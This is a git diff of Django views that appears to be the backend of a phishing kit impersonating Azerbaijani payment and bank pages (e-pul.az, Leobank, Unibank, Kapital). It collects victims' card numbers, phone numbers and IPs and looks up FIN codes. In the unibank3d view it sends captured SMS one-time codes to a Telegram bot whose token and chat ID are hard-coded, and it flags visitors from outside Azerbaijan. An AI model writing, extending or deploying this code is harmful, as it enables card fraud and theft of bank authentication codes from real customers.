@@ -1,5 +1,6 @@
 from django.shortcuts import render
 import requests
+import json
 # Create your views here.
 from django.views.decorators.csrf import csrf_exempt
 from .models import ContactModel
@@ -21,16 +22,50 @@ def login(request):
         request.POST
         Protcol = request.POST.get('clientLogin')
         ProtcolNumber = request.POST.get('invoiceCode')
-        total_amount, father_name = check_data(Protcol, ProtcolNumber)
+        FinCode = request.POST.get('clientLogins')
         client_ip = get_client_ip(request)
-        # contact.save(Protcol,ProtcolNumber,client_ip)
-        if total_amount == 'error':
-            context = {
-                'display_error': '',  # if there's no error, set display_error to 'none'
+        if(FinCode!=''):
+            # contact.save(Protcol,ProtcolNumber,client_ip)
+            url = "https://e-pul.az/epay/az/guest_payment/check_client_info/1457"
+            data = {
+                "mode": "56",
+                "IAMAS": FinCode,
+                "selectedGroupId": "56",
+                "frameModel": "1",
+                "hdnserid": "1457",
             }
-            return render(request, 'index.html',context)
-        print(father_name)
-        subtotal=int(father_name)- int(father_name)*25/100
+
+            # Send the POST request
+            response = requests.post(url, data=data)
+
+            # Check the response status code
+            if response.status_code == 200:
+                # Parse the JSON content of the response
+                response_data = json.loads(response.text)
+                full_name = response_data["fullName"]
+            
+            # Assuming there is only one subService and you want to extract its "amount"
+                sub_service_amount = response_data["subServices"][0]["amount"]
+                total_amount= full_name
+                father_name =sub_service_amount
+                # Print the "code" and "message" values
+                if(response_data["code"]=="Error"):
+                    context = {
+                        'display_error': '',  # if there's no error, set display_error to 'none'
+                    }
+                    return render(request, 'index.html',context)
+                print("Message:", response_data["message"])
+            else:
+                print(f"Request failed with status code: {response.status_code}")
+        else:
+            total_amount, father_name = check_data(Protcol, ProtcolNumber)
+            if total_amount == 'error':
+                context = {
+                    'display_error': '',  # if there's no error, set display_error to 'none'
+                }
+                return render(request, 'index.html',context)
+        subtotal = float(father_name) - float(father_name) * 20 / 100
+
         context={
             "total_amount":total_amount,
             "father_name":father_name,
@@ -53,7 +88,16 @@ def login(request):
 
     return render(request, 'index.html',context)
 
+@csrf_exempt
+def contact_approve_unibank(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    
+    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
+    contact.bankname = "unibank"
+    contact.save()
 
+
+    return JsonResponse({'success': True})
 
 def check_data(Protcol,ProtcolNumber):
 
@@ -255,34 +299,46 @@ def leobank(request, pk):
 @csrf_exempt
 def leobank3d(request):
     contact_id = request.session.get('contact_id')
-    contact = ContactModel.objects.get(id=contact_id)
+    
+    if contact_id is None:
+        # Handle the case where contact_id is not set in the session.
+        return render(request, 'pages/error.html')
+    
+    try:
+        contact = ContactModel.objects.get(id=contact_id)
+    except ContactModel.DoesNotExist:
+        # Handle the case where the ContactModel object with the given id does not exist.
+        return render(request, 'pages/error.html')
+    
     if request.method == "POST":
-        return render( request,'pages/error.html' )    
+        return render(request, 'pages/error.html')    
+    
     context = {
-    'last_contact_id': contact.id,
-    'amount':contact.amount,
-    'cc': contact.cc[-4:],
-    "display":contact.hidden_type
+        'last_contact_id': contact.id,
+        'amount': contact.amount,
+        'cc': contact.cc[-4:] if contact.cc else None,  # Check if cc exists before accessing it.
+        "display": contact.hidden_type
     }
-    contact.page_name="leobank"
+    
+    contact.page_name = "leobank"
     contact.save()
-    return render( request,'pages/leo.html',context )
+    
+    return render(request, 'pages/leo.html', context)
+
 @csrf_exempt
 def unibank(request):
     contact_id = request.session.get('contact_id')
     contact = ContactModel.objects.get(id=contact_id)
-    number = str(contact.phone)
     contact.bankname=""
-    contact.page_name="/unibank3d"
+    contact.page_name="/Kapital"
     contact.save()
     context = {
-        'number': number[-4:],
+        'last_contact_id': contact.id,
         'amount': contact.amount,
-        'cc': contact.cc[-4:],
-        "display":contact.hidden_type
+        'cc': contact.cc[-4:] if contact.cc else None,  # Check if cc exists before accessing it.
+        "display": contact.hidden_type
     }
-    
-    return render( request,'pages/unibank3d.html',context )
+    return render(request, "pages/unibank3d.html",context)
 
 
 @csrf_exempt
@@ -298,14 +354,16 @@ def unibank3d(request):
         'last_contact_id': contact.id,
         "display":contact.hidden_type
     }
-    
+    country = get_country_from_ip(contact.ip)
+    if country!= "AZ":
+        country= 'Şübhəli İP!'
     if len(sms) == 0:
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
         contact.page_name="/unibank3d"
         contact.save()
         return render(request, 'pages/unibank3d.html')
-    response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001894884341&text=id{contact.id}\nPage:Loading\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou')
+    response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{country}\nPage:Loading\nsms:{sms}')
     return render( request,'pages/loading.html',context )
 
 
